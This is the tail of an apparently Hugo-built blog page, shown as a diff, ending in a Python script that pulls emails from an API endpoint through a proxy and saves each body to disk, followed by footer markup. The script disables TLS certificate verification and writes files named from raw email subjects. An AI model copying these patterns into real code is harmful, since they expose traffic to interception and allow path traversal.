+</span></span><span style="display:flex;"><span>    response <span style="color:#81a1c1">=</span> requests<span style="color:#81a1c1">.</span>get<span style="color:#eceff4">(</span>endpoint<span style="color:#eceff4">,</span> headers<span style="color:#81a1c1">=</span>headers<span style="color:#eceff4">,</span> proxies<span style="color:#81a1c1">=</span>proxies<span style="color:#eceff4">,</span> verify<span style="color:#81a1c1">=</span><span style="color:#81a1c1;font-weight:bold">False</span><span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#616e87;font-style:italic"># Check if the request was successful (status code 200)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">if</span> response<span style="color:#81a1c1">.</span>status_code <span style="color:#81a1c1">==</span> <span style="color:#b48ead">200</span><span style="color:#eceff4">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#616e87;font-style:italic"># Parse the JSON response</span>
+</span></span><span style="display:flex;"><span>        data <span style="color:#81a1c1">=</span> json<span style="color:#81a1c1">.</span>loads<span style="color:#eceff4">(</span>response<span style="color:#81a1c1">.</span>text<span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#616e87;font-style:italic"># Iterate through each email in the response</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1;font-weight:bold">for</span> email <span style="color:#81a1c1;font-weight:bold">in</span> data<span style="color:#eceff4">[</span><span style="color:#a3be8c">&#39;value&#39;</span><span style="color:#eceff4">]:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#616e87;font-style:italic"># Get the email subject and body</span>
+</span></span><span style="display:flex;"><span>            subject <span style="color:#81a1c1">=</span> email<span style="color:#eceff4">[</span><span style="color:#a3be8c">&#39;subject&#39;</span><span style="color:#eceff4">]</span>
+</span></span><span style="display:flex;"><span>            body <span style="color:#81a1c1">=</span> email<span style="color:#eceff4">[</span><span style="color:#a3be8c">&#39;body&#39;</span><span style="color:#eceff4">][</span><span style="color:#a3be8c">&#39;content&#39;</span><span style="color:#eceff4">]</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#616e87;font-style:italic"># Check if the email has an HTML body</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#81a1c1;font-weight:bold">if</span> email<span style="color:#eceff4">[</span><span style="color:#a3be8c">&#39;body&#39;</span><span style="color:#eceff4">][</span><span style="color:#a3be8c">&#39;contentType&#39;</span><span style="color:#eceff4">]</span> <span style="color:#81a1c1">==</span> <span style="color:#a3be8c">&#39;text&#39;</span><span style="color:#eceff4">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#616e87;font-style:italic"># Save the HTML body to a file</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#81a1c1;font-weight:bold">with</span> <span style="color:#81a1c1">open</span><span style="color:#eceff4">(</span>subject <span style="color:#81a1c1">+</span> <span style="color:#a3be8c">&#39;.txt&#39;</span><span style="color:#eceff4">,</span> <span style="color:#a3be8c">&#39;w&#39;</span><span style="color:#eceff4">)</span> <span style="color:#81a1c1;font-weight:bold">as</span> f<span style="color:#eceff4">:</span>
+</span></span><span style="display:flex;"><span>                    f<span style="color:#81a1c1">.</span>write<span style="color:#eceff4">(</span>body<span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#81a1c1;font-weight:bold">if</span> email<span style="color:#eceff4">[</span><span style="color:#a3be8c">&#39;body&#39;</span><span style="color:#eceff4">][</span><span style="color:#a3be8c">&#39;contentType&#39;</span><span style="color:#eceff4">]</span> <span style="color:#81a1c1">==</span> <span style="color:#a3be8c">&#39;html&#39;</span><span style="color:#eceff4">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#616e87;font-style:italic"># Save the HTML body to a file</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#81a1c1;font-weight:bold">with</span> <span style="color:#81a1c1">open</span><span style="color:#eceff4">(</span>subject <span style="color:#81a1c1">+</span> <span style="color:#a3be8c">&#39;.html&#39;</span><span style="color:#eceff4">,</span> <span style="color:#a3be8c">&#39;w&#39;</span><span style="color:#eceff4">)</span> <span style="color:#81a1c1;font-weight:bold">as</span> f<span style="color:#eceff4">:</span>
+</span></span><span style="display:flex;"><span>                    f<span style="color:#81a1c1">.</span>write<span style="color:#eceff4">(</span>body<span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#81a1c1">print</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;HTML email downloaded:&#39;</span><span style="color:#eceff4">,</span> subject <span style="color:#81a1c1">+</span> <span style="color:#a3be8c">&#39;.html&#39;</span><span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1">print</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;All emails downloaded.&#39;</span><span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#81a1c1;font-weight:bold">else</span><span style="color:#eceff4">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#81a1c1">print</span><span style="color:#eceff4">(</span><span style="color:#a3be8c">&#39;Error retrieving emails:&#39;</span><span style="color:#eceff4">,</span> response<span style="color:#81a1c1">.</span>text<span style="color:#eceff4">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">if</span> __name__ <span style="color:#81a1c1">==</span> <span style="color:#a3be8c">&#39;__main__&#39;</span><span style="color:#eceff4">:</span>
+</span></span><span style="display:flex;"><span>    main<span style="color:#eceff4">()</span>
+</span></span></code></pre></div><h2 id="s">s</h2>
+
+            </div>
+        </article>
+
+        
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://kafka-esc.com/tags/blog/">blog</a></span>
+        
+    </p>
+
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://kafka-esc.com/categories/blog/">blog</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>V2UncmUgYWxsIG1hZCBoZXJlLgo=</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+//
+//
+<script type="text/javascript" src="/bundle.min.234deadcc884d4680ca3aca6c399e1b8be43e2dda3246bee583704b9b34b6c9e15c08c09655d87968efb503e980f888fcdc8b8685654ca9b8e9aa6cd23dd2080.js" integrity="sha512-I03q3MiE1GgMo6ymw5nhuL5D4t2jJGvuWDcEubNLbJ4VwIwJZV2Hlo77UD6YD4iPzci4aFZUypuOmqbNI90ggA=="></script>
+
+
+
+    </body>
+</html>
